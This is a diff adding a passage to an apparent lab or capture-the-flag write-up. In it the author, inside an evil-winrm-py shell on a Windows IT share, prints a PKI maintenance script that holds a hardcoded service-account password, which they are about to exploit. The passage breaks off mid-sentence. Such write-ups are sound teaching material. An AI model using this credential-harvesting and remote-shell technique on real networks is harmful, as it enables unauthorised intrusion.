@@ -522,3 +522,63 @@ evil-winrm-py PS C:\Shares\IT>
 
 This user has access to the IT share, this is likely the admin group bloodhound showed allowing us access
 
+```python
+evil-winrm-py PS C:\Shares\IT\Scripts> type Publish-CRL.ps1
+<#
+.SYNOPSIS
+    Scheduled maintenance task for Orion Corp PKI.
+    Publishes the latest CRL and verifies CA service health.
+
+.NOTES
+    Author:   IT Operations
+    Contact:  it-ops@orion.local
+    Schedule: Daily 02:00 via Task Scheduler on DC01
+    Account:  svc-pki (dedicated PKI service account)
+#>
+
+# --- Service account credentials (used to connect to the CA) ---
+$caUser = "ORION\svc-pki"
+$caPass = ConvertTo-SecureString 'Pki@Orion2026!' -AsPlainText -Force
+$caCred = New-Object System.Management.Automation.PSCredential($caUser, $caPass)
+
+$CAName   = "DC01\orion-DC01-CA"
+$CrlPath  = "\\DC01\CRLDist$"
+$LogFile  = "C:\Shares\IT\Logs\crl-publish.log"
+
+function Write-Log {
+    param([string]$Message)
+    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Add-Content -Path $LogFile -Value "$ts  $Message"
+}
+
+Write-Log "=== CRL publish job started ==="
+
+try {
+    # Re-publish the Certificate Revocation List
+    Write-Log "Publishing CRL for $CAName ..."
+    certutil -config $CAName -CRL | Out-Null
+    Write-Log "CRL published successfully."
+
+    # Copy freshly generated CRL to the distribution point
+    $src = "C:\Windows\System32\CertSrv\CertEnroll\*.crl"
+    Copy-Item -Path $src -Destination $CrlPath -Force
+    Write-Log "CRL copied to distribution point $CrlPath."
+
+    # Verify CA service is running
+    $svc = Get-Service -Name CertSvc -ErrorAction Stop
+    if ($svc.Status -ne 'Running') {
+        Write-Log "WARNING: CertSvc not running (status: $($svc.Status)). Attempting restart."
+        Start-Service CertSvc
+    } else {
+        Write-Log "CertSvc healthy (Running)."
+    }
+}
+catch {
+    Write-Log "ERROR: $($_.Exception.Message)"
+}
+
+Write-Log "=== CRL publish job finished ==="
+evil-winrm-py PS C:\Shares\IT\Scripts>
+```
+
+The IT directory has a script that has har
